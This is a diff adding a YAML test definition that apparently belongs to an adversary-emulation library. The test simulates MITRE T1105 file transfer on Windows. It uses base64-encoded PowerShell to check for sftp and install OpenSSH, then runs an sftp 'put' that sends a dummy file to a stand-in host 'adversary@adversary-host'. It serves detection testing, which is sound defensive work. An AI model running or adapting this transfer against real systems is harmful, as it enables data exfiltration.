@@ -1,0 +1,30 @@
+- id: 6ef7eb81-fb34-5875-9864-30881b3dd97b
+  name: Soumaia ART Tests - Windows push file using sftp.exe
+  description: This test simulates pushing files using SFTP on a Windows environment. (requires elevation)
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIABzAGYAdABwACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAIAB7AAoAIAAgACAAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAUwBGAFQAUAAgAGMAbwBtAG0AYQBuAGQAIABpAHMAIABhAHYAYQBpAGwAYQBiAGwAZQAuACIACgAgACAAIAAgAGUAeABpAHQAIAAwAAoAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAUwBGAFQAUAAgAGMAbwBtAG0AYQBuAGQAIABpAHMAIABuAG8AdAAgAGEAdgBhAGkAbABhAGIAbABlAC4AIgAKACAAIAAgACAAZQB4AGkAdAAgADEACgB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand IwAgAEQAZQBmAGkAbgBlACAAdABoAGUAIABjAGEAcABhAGIAaQBsAGkAdAB5ACAAbgBhAG0AZQAgAGYAbwByACAATwBwAGUAbgBTAFMASAAgAEMAbABpAGUAbgB0AAoAJABjAGEAcABhAGIAaQBsAGkAdAB5AE4AYQBtAGUAIAA9ACAAIgBPAHAAZQBuAFMAUwBIAC4AQwBsAGkAZQBuAHQAfgB+AH4AfgAwAC4AMAAuADEALgAwACIACgB0AHIAeQAgAHsACgAgACAAIAAgACMAIABJAG4AcwB0AGEAbABsACAAdABoAGUAIABPAHAAZQBuAFMAUwBIACAAQwBsAGkAZQBuAHQAIABjAGEAcABhAGIAaQBsAGkAdAB5AAoAIAAgACAAIABBAGQAZAAtAFcAaQBuAGQAbwB3AHMAQwBhAHAAYQBiAGkAbABpAHQAeQAgAC0ATwBuAGwAaQBuAGUAIAAtAE4AYQBtAGUAIAAkAGMAYQBwAGEAYgBpAGwAaQB0AHkATgBhAG0AZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIATwBwAGUAbgBTAFMASAAgAEMAbABpAGUAbgB0ACAAaABhAHMAIABiAGUAZQBuACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABpAG4AcwB0AGEAbABsAGUAZAAuACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAARwByAGUAZQBuAAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACMAIABIAGEAbgBkAGwAZQAgAGEAbgB5ACAAZQByAHIAbwByAHMAIAB0AGgAYQB0ACAAbwBjAGMAdQByACAAZAB1AHIAaQBuAGcAIAB0AGgAZQAgAGkAbgBzAHQAYQBsAGwAYQB0AGkAbwBuACAAcAByAG8AYwBlAHMAcwAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQQBuACAAZQByAHIAbwByACAAbwBjAGMAdQByAHIAZQBkACAAdwBoAGkAbABlACAAaQBuAHMAdABhAGwAbABpAG4AZwAgAE8AcABlAG4AUwBTAEgAIABDAGwAaQBlAG4AdAA6ACAAJABfACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAUgBlAGQACgB9AAoA
+          }
+          # Check if the folder exists, create it if it doesn't
+          $folderPath = "C:\temp"
+          if (-Not (Test-Path -Path $folderPath)) {
+              New-Item -Path $folderPath -ItemType Directory
+          }
+          # Create the file
+          $filePath = Join-Path -Path $folderPath -ChildPath "T1105.txt"
+          New-Item -Path $filePath -ItemType File -Force
+          Write-Output "File created: $filePath"
+          # Attack command
+          echo "put C:\temp\T1105.txt" | sftp adversary@adversary-host:/tmp
+        cleanup: |-
+          $filePath = Join-Path -Path "C:\temp" -ChildPath "T1105.txt"
+          Remove-Item -Path $filePath -Force
+          Write-Output "File deleted: $filePath"
